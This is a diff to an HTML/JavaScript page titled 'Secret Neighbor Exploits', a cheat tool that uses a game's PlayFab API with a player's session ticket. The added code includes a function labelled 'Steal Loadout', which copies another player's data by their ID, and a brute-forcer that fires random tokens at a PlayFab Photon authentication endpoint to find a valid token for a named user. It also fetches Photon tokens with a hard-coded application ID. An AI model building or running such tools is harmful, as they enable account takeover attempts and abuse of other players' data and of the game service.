@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -384,6 +385,33 @@
     </div>
 
     <div class="section">
+      <h2>🔑 Photon Token Generator</h2>
+      <button onclick="getPhotonToken()">Generate Photon Token</button>
+      <div class="output" id="photonTokenOutput">Token will appear here...</div>
+    </div>
+
+    <div class="section">
+      <h2>🔄 Reset Loadout</h2>
+      <button onclick="resetLoadout()">Reset Loadout</button>
+      <div class="output" id="resetLoadoutOutput">Results will appear here...</div>
+    </div>
+
+    <div class="section">
+      <h2>🕵️ Steal Loadout</h2>
+      <input id="targetPlayFabId" placeholder="Target PlayFab ID" type="text">
+      <button onclick="stealLoadout()">Steal Loadout</button>
+      <div class="output" id="stealLoadoutOutput">Results will appear here...</div>
+    </div>
+
+    <div class="section">
+      <h2>🔨 Photon Token Bruteforcer</h2>
+      <input id="playFabUsername" placeholder="PlayFab Username" type="text">
+      <button onclick="startBruteforce()">Start Bruteforce</button>
+      <button onclick="stopBruteforce()">Stop Bruteforce</button>
+      <div class="output" id="bruteforceOutput">Results will appear here...</div>
+    </div>
+
+    <div class="section">
       <h2>📄 How to Get Your SessionTicket with Requestly</h2>
       <ol>
         <li>Download the Requestly desktop app from <a href="https://docs.requestly.com/general/sessions/record-api-sessions" target="_blank">here</a>.</li>
@@ -403,6 +431,7 @@
     let coinFarmIntervalId = null;
     let levelEditorRunning = false;
     let levelEditorIntervalId = null;
+    let bruteforceRunning = false;
 
     function setSessionTicket() {
       sessionTicket = document.getElementById("sessionTicketInput").value.trim();
@@ -1246,6 +1275,129 @@
       levelEditorIntervalId = setInterval(runLevelEditorCycle, 100); // 100ms minimal delay to prevent overload
     }
 
+    // NEW: Photon Token Generator
+    async function getPhotonToken() {
+      const data = await makeApiCall("Client/GetPhotonAuthenticationToken", "POST", {
+        PhotonApplicationId: "2b76b55a-bf65-47af-836f-daa9c8eb9f1e",
+        AuthenticationContext: null
+      });
+      const output = document.getElementById("photonTokenOutput");
+      if (data.data && data.data.Token) {
+        output.textContent = `Photon Token: ${data.data.Token}`;
+      } else {
+        output.textContent = `Error: ${data.error || "Unknown error"}`;
+      }
+    }
+
+    // NEW: Reset Loadout
+    async function resetLoadout() {
+      const output = document.getElementById("resetLoadoutOutput");
+      const getData = await makeApiCall("Client/GetUserData", "POST", {});
+      if (getData.error) {
+        output.textContent = `Error getting data: ${getData.error}`;
+        return;
+      }
+      if (getData.data.Data && "loadout" in getData.data.Data) {
+        const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
+          Data: { loadout: null }
+        });
+        if (updateData.error) {
+          output.textContent = `Error resetting: ${updateData.error}`;
+        } else {
+          output.textContent = "Loadout reset successfully!";
+        }
+      } else {
+        output.textContent = "No loadout found to reset.";
+      }
+    }
+
+    // NEW: Steal Loadout
+    async function stealLoadout() {
+      const targetId = document.getElementById("targetPlayFabId").value.trim();
+      const output = document.getElementById("stealLoadoutOutput");
+      if (!targetId) {
+        output.textContent = "Please enter a target PlayFab ID.";
+        return;
+      }
+      const getData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
+        PlayFabId: targetId,
+        InfoRequestParameters: { GetUserData: true }
+      });
+      if (getData.error) {
+        output.textContent = `Error getting data: ${getData.error}`;
+        return;
+      }
+      const userData = getData.data.InfoResultPayload.UserData;
+      if (userData && "loadout" in userData) {
+        const loadoutValue = userData.loadout.Value;
+        const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
+          Data: { loadout: loadoutValue }
+        });
+        if (updateData.error) {
+          output.textContent = `Error updating: ${updateData.error}`;
+        } else {
+          output.textContent = "Loadout stolen successfully!";
+        }
+      } else {
+        output.textContent = "No loadout found on target.";
+      }
+    }
+
+    // NEW: Photon Token Bruteforcer
+    function generateRandomToken() {
+      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+      let token = '';
+      for (let i = 0; i < 50; i++) {
+        token += chars[Math.floor(Math.random() * chars.length)];
+      }
+      return token;
+    }
+
+    async function checkToken(username, token) {
+      try {
+        const res = await fetch(`https://bdff1.playfabapi.com/photon/authenticate?username=${username}&token=${token}`);
+        return await res.json();
+      } catch (error) {
+        return { error: error.message };
+      }
+    }
+
+    function startBruteforce() {
+      if (bruteforceRunning) return;
+      const username = document.getElementById("playFabUsername").value.trim();
+      if (!username) {
+        document.getElementById("bruteforceOutput").textContent = "Please enter a PlayFab Username.";
+        return;
+      }
+      bruteforceRunning = true;
+      const output = document.getElementById("bruteforceOutput");
+      output.textContent = "Starting bruteforce...\n";
+      async function tryToken() {
+        if (!bruteforceRunning) return;
+        const token = generateRandomToken();
+        output.textContent += `Trying ${token}...\n`;
+        const result = await checkToken(username, token);
+        if (result.error) {
+          output.textContent += `Error: ${result.error}\n`;
+        } else {
+          output.textContent += `Response: ${JSON.stringify(result)}\n`;
+          if (result.resultCode === 1) {
+            output.textContent += `✅ Valid token found: ${token}\n`;
+            stopBruteforce();
+            return;
+          }
+        }
+        output.scrollTop = output.scrollHeight;
+        setTimeout(tryToken, 100); // Delay to avoid rate limiting
+      }
+      tryToken();
+    }
+
+    function stopBruteforce() {
+      bruteforceRunning = false;
+      document.getElementById("bruteforceOutput").textContent += "Bruteforce stopped.\n";
+    }
+
     // Initialize page
     document.addEventListener("DOMContentLoaded", function() {
       console.log("Secret Neighbor Exploits page loaded");
@@ -1262,3 +1414,4 @@
   </script>
 </body>
 </html>
+```
